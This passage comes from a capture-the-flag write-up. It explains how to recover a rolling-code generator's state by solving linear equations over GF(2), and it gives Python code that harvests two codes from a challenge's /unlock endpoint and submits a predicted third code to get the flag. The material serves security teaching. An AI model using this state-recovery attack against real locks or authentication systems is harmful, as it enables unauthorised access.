+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} \newline
+0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \newline
+0 0 \color{red}{1} \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \newline
+0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} \newline
+0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0
+\end{pmatrix}
+$$</p>
+<p>Notice that we are working in Galois Field of 2-dimension (we only have 0 and 1). Therefore, the sum operation is the same as the XOR operation, and the product is equal to the AND operation.</p>
+<p>Let&rsquo;s remember how the <code>ret</code> (rolling code we need to get the flag) is computed:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+
+<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
+    <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
+    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>
+
+    <span class=mtk3># Changes in state</span>  
+</code></pre></div>
+<p>It is formed by the least significant bit of <code>state</code> in each iteration. So, we need the last row of matrices $I, A, A^2, A^3, \dots, A^{24}, A^{25}$, which are related to the last bit of the current <code>state</code> on each iteration.</p>
+<p>The idea is to solve a system of equations so that we can get the current <code>state</code>. With one rolling code, we have 26 equations (as the code is a 26-bit number). Although the <code>state</code> is 64 bits long, we have shown that every four bits, there are two that have the same value (this fact leads to 16 equations). Hence, we have 48 unknowns. Then, to solve for a complete <code>state</code>, we will need at least two rolling codes. We will need to concatenate the two rolling codes and compute the last row for matrices $A^0$ through $A^{47}$.</p>
+<p>These will be some of the equations of the system we need to solve (where $s$ is the <code>state</code> and $r$ and $t$ are the two <code>ret</code> rolling codes):</p>
+<p>$$
+\begin{cases}
+s_{63} + s_{60} & = & 0 \newline
+s_{59} + s_{56} & = & 0 \newline
+\dots & = & 0 \newline
+s_3 + s_0 & = & 0 \newline
+s_0 & = & r_{25} \newline
+s_{61} + s_2 & = & r_{24} \newline
+\dots & = & \dots \newline
+\dots & = & r_0 \newline
+\dots & = & t_{25} \newline
+\dots & = & \dots \newline
+\dots & = & t_5 \newline
+\dots & = & t_4 \newline
+\end{cases}
+$$</p>
+<p>This system of equations can be translated into matrix form like this:</p>
+<p>$$
+M \cdot \begin{pmatrix} s_{63} \newline \dots \newline s_0 \end{pmatrix} = \begin{pmatrix} 0 \newline \overset{(16)}{\dots} \newline 0 \newline r_{25} \newline \dots \newline r_0 \newline t_{25} \newline \dots \newline t_5 \newline t_4 \end{pmatrix}
+$$</p>
+<p>Where $M$ rows are the first 16 equations in matrix form and the last row of the matrices $I, A, A^2, A^3, \dots, A^{47}$.</p>
+<p>To solve the system of equations, we can use Gauss elimination working in Galois Field of 2-dimension ($\mathbb{F}_2$):</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>gauss_elim</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">b_mat</span><span class=mtk1>):</span>
+    <span class=mtk1>aug_mat</span> <span class=mtk5>=</span> <span class=mtk8>add_column</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">b_mat</span><span class=mtk1>)</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
+        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
+            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
+                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>].copy(),</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>].copy()</span>  
+                <span class=mtk5>break</span>
+
+        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
+            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
+                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>a</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>a</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">zip</span><span class=mtk1>(</span><span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>])]</span>
+    
+    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
+        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
+            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
+                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>a</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>a</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">zip</span><span class=mtk1>(</span><span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>])]</span>
+
+    <span class=mtk5>return</span> <span class=mtk1>[</span><span class=mtk1>r</span><span class=mtk1>[</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>for</span> <span class=mtk1>r</span> <span class=mtk5>in</span> <span class=mtk1>aug_mat</span><span class=mtk1>]</span>
+</code></pre></div>
+<p>The algorithm is well-known, so I will not explain it (one thing to consider is that we are in $\mathbb{F}_2$). Other method to solve this is computing the inverse of $M$ in $\mathbb{F}_2$, which can be done with SageMath.</p>
+<p>Anyway, I developed a Python script to solve this part of the challenge automatically:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">re</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">requests</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">sys</span>
+
+
+<span class=mtk3># Functions and global variables</span>
+
+<span class=mtk1>url</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>get_code</span><span class=mtk1>():</span>
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">requests</span><span class=mtk1>.</span><span class=mtk8>post</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>url</span><span class=mtk6>}</span><span class=mtk4>/unlock'</span><span class=mtk1>,</span> <span class=mtk1>{</span><span class=mtk4>'code'</span><span class=mtk1>:</span> <span class=mtk6>1</span><span class=mtk1>})</span>
+    <span class=mtk5>return</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>findall</span><span class=mtk1>(</span><span class="mtk7 mtki">r</span><span class=mtk4>'(\d</span><span class=mtk5>+</span><span class=mtk4>)'</span><span class=mtk1>,</span> <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk1>text</span><span class=mtk1>)[</span><span class=mtk6>0</span><span class=mtk1>])</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk5>global</span> <span class=mtk1>state</span>
+
+    <span class=mtk1>code1</span> <span class=mtk5>=</span> <span class=mtk8>get_code</span><span class=mtk1>()</span>
+    <span class=mtk1>code2</span> <span class=mtk5>=</span> <span class=mtk8>get_code</span><span class=mtk1>()</span>
+
+    <span class=mtk1>codes</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk4>'0'</span> <span class=mtk5>*</span> <span class=mtk6>16</span> <span class=mtk5>+</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>code1</span><span class="mtk7 mtki">:026b</span><span class=mtk6>}</span><span class=mtk4>'</span> <span class=mtk5>+</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>code2</span><span class="mtk7 mtki">:026b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)[:</span><span class=mtk6>64</span><span class=mtk1>]</span>  
+    <span class=mtk1>codes_vector</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class=mtk1>codes</span><span class=mtk1>)))</span>
+
+    <span class=mtk1>comp_state</span> <span class=mtk5>=</span> <span class=mtk8>gauss_elim</span><span class=mtk1>(</span><span class=mtk1>ret_mat</span><span class=mtk1>,</span> <span class=mtk1>codes_vector</span><span class=mtk1>)</span>
+    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk4>''</span><span class=mtk1>.</span><span class=mtk8>join</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">str</span><span class=mtk1>,</span> <span class=mtk1>comp_state</span><span class=mtk1>)),</span> <span class=mtk6>2</span><span class=mtk1>)</span>
+
+    <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
+    <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
+    <span class=mtk1>code3</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">requests</span><span class=mtk1>.</span><span class=mtk8>post</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>url</span><span class=mtk6>}</span><span class=mtk4>/unlock'</span><span class=mtk1>,</span> <span class=mtk1>{</span><span class=mtk4>'code'</span><span class=mtk1>:</span> <span class=mtk1>code3</span><span class=mtk1>})</span>
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk1>text</span><span class=mtk1>)</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div>
+<p>These functions take the two rolling codes from the error message in the website needed to compute the state (<code>comp_state</code>), and then calculate the third rolling code to send it to the lock and get the flag.</p>
+<p>The variable <code>ret_mat</code> is matrix $M$, computed as follows:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>state_mat_initial</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk6>...</span><span class=mtk1>]</span>
+<span class=mtk1>ret_mat</span> <span class=mtk5>=</span> <span class=mtk1>[]</span>
+
+<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
+    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{9</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>(</span><span class=mtk6>4</span> <span class=mtk5>*</span> <span class=mtk1>i</span><span class=mtk1>)</span><span class="mtk7 mtki">:064b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>))))</span>
+
+<span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>i</span> <span class=mtk5>==</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span> <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span>  
+
+<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>48</span><span class=mtk1>):</span>
+    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class=mtk1>state_mat</span><span class=mtk1>[</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>])</span>
+    <span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk8>multiply_matrix</span><span class=mtk1>(</span><span class=mtk1>state_mat</span><span class=mtk1>,</span> <span class=mtk1>state_mat_initial</span><span class=mtk1>)</span>
+</code></pre></div>
+<p>Where <code>state_mat_initial</code> is the tweaked $A$ matrix.</p>
+<p>Then we add some operation functions to work in $\mathbb{F}_2$. Again, these algorithms are kind of standard:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>multiply_vector</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>):</span>
+    <span class=mtk1>z_vector</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk6>0</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>))]</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
+        <span class=mtk5>for</span> <span class=mtk1>k</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>)):</span>
+            <span class=mtk1>z_vector</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>^=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>k</span><span class=mtk1>]</span> <span class=mtk5>&amp;</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>[</span><span class=mtk1>k</span><span class=mtk1>]</span>
+
+    <span class=mtk5>return</span> <span class=mtk1>z_vector</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>multiply_matrix</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>):</span>
+    <span class=mtk5>if</span> <span class="mtk8 mtku">type</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>])</span> <span class=mtk5>==</span> <span class="mtk8 mtku">int</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk8>multiply_vector</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>)</span>
+
+    <span class=mtk1>z_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class=mtk6>0</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]))]</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>))]</span>  
+
+    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
+        <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>])):</span>
+            <span class=mtk5>for</span> <span class=mtk1>k</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>)):</span>
+                <span class=mtk1>z_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]</span> <span class=mtk5>^=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>k</span><span class=mtk1>]</span> <span class=mtk5>&amp;</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk1>k</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]</span>
+
+    <span class=mtk5>return</span> <span class=mtk1>z_mat</span>
+
+
